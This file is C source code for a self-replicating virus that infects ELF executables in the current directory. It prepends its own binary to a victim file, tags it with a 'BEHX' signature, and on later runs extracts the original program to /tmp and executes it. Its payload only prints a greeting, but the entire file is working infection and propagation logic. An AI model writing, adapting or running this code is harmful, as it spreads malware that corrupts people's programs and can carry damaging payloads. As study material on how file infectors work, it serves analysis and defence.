#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <errno.h>

long get_binary_file_length(char* file_name)
{
    long file_length;
    FILE *fp = fopen(file_name, "rb");
    if (fp)
    {
        fseek(fp, 0, SEEK_END);
        file_length = ftell(fp);
        fseek(fp, 0, SEEK_SET);
    }
    fclose(fp);
    return file_length;
}

// The first four bytes of elf files are {0x7f, 'E', 'L', 'F'}
int is_elf(char *file_name)
{
    FILE *fp = fopen(file_name, "rb");
    if (fp)
    {
        char buff[4];
        for (int i = 0; i < 4; i++)
            buff[i] = fgetc(fp);
        fclose(fp);
        if (buff[0] == 0x7f && buff[1] == 'E' && buff[2] == 'L' && buff[3] == 'F')
            return 1;
    }
    return 0;
}

int is_infected(char *file_name, char *signature, int signature_length)
{
    char buff[signature_length + 1];
    FILE *fp = fopen(file_name, "rb");
    if (fp)
    {
        fseek(fp, (-1 * signature_length), SEEK_END);

        for (int i = 0; i < signature_length; i++)
            buff[i] = fgetc(fp);
        buff[signature_length] = '\0';
        fclose(fp);

        if (!strcmp(buff, signature))
            return 1;
        else
            return 0;
    }
    return 0;
}

// Don't try to infect the virus itself :D
int is_origin_virus(char *file_name)
{
    if (!strcmp(file_name, "virus") || !strcmp(file_name, "./virus"))
        return 1;
    return 0;
}

char *find_target(char *signature, int signature_length)
{
    struct dirent *dent;
    DIR *dir = opendir(".");
    if (dir == NULL)
        return NULL;
    else
    {
        while ((dent = readdir(dir)) != NULL)
        {
            char* file_name_ptr = dent->d_name;
            char* file_name = (char*) malloc(sizeof(char) * (strlen(file_name_ptr) + 1));
            strcpy(file_name, file_name_ptr);
            if (!strcmp(file_name, ".") || !strcmp(file_name, ".."))
                continue;
            else
            {
                if (!is_infected(file_name, signature, signature_length) && is_elf(file_name) && !is_origin_virus(file_name))
                {
                    closedir(dir);
                    return file_name;
                }
            }
        }
        closedir(dir);
        return NULL;
    }
}

void execute_payload()
{
    printf("Hello! I am a simple virus!\n");
}

// Mark the binary file so the virus can later recognize that this file is already infected
void mark_victim(char *file_name, char *signature)
{
    FILE *fp = fopen(file_name, "ab");
    for (int i = 0; i < strlen(signature); i++)
        fputc(signature[i], fp);
    fclose(fp);
}

int infect(char *victim_file_name, char *virus_binary_file_name, long virus_length)
{
    long victim_length = get_binary_file_length(victim_file_name);
    long cnt = 0;
    int final_binary[virus_length + victim_length];

    FILE *virus_fp = fopen(virus_binary_file_name, "rb");
    for (; cnt < virus_length; cnt++)
        final_binary[cnt] = fgetc(virus_fp);
    fclose(virus_fp);

    FILE *victim_fp = fopen(victim_file_name, "rb");
    for (; cnt < victim_length + virus_length; cnt++)
        final_binary[cnt] = fgetc(victim_fp);
    fclose(victim_fp);

    FILE *new_fp = fopen(victim_file_name, "wb");
    if (new_fp)
    {
        for (long i = 0; i < virus_length + victim_length; i++)
            fputc(final_binary[i], new_fp);
        fclose(new_fp);
        return 1;
    }
    else
        return 0;
}

void *extract_main_elf_from_virus(char* bin_file_name, char* tmp_file_name, long virus_length, long signature_length)
{
    long binary_length = get_binary_file_length(bin_file_name);
    FILE *fp = fopen(bin_file_name, "rb");
    FILE *tmp_fp = fopen(tmp_file_name, "wb");
    fseek(fp, virus_length, SEEK_SET);
    for (long i = 0; i < binary_length - virus_length - signature_length; i++)
        fputc(fgetc(fp), tmp_fp);
    fclose(fp);
    fclose(tmp_fp);

    //Set file permission to executable
    char mode[] = "0755";
    int i = strtol(mode, 0, 8);
    if (chmod(tmp_file_name, i) < 0)
        printf("error in chmod() - %d (%s)\n", errno, strerror(errno));
}

void execute_main_elf(char* file_name, char* argv[], char* tmp_file_name, long virus_length, long signature_length)
{
    extract_main_elf_from_virus(file_name, tmp_file_name, virus_length, signature_length);
    pid_t pid = fork();
    if (pid == 0)
    {
        if (execv(tmp_file_name, argv) < 0)
            perror("execv");
    }
    else
    {
        waitpid(pid, NULL, 0);
        remove(tmp_file_name);
    }
}

int main(int argc, char* argv[])
{
    char* signature = "BEHX";
    char* tmp_file_name = "/tmp/behx";
    char* binary_file_name = argv[0];

    // Check this everytime you change the code!
    long virus_size = 13912;
    
    execute_payload();

    char* victim_file_name = find_target(signature, strlen(signature));
    if (victim_file_name)
    {
        int success = infect(victim_file_name, binary_file_name, virus_size);
        if (success)
            mark_victim(victim_file_name, signature);
    }
    if (!is_origin_virus(binary_file_name))
        execute_main_elf(binary_file_name, argv, tmp_file_name, virus_size, strlen(signature));
    return 0;
}
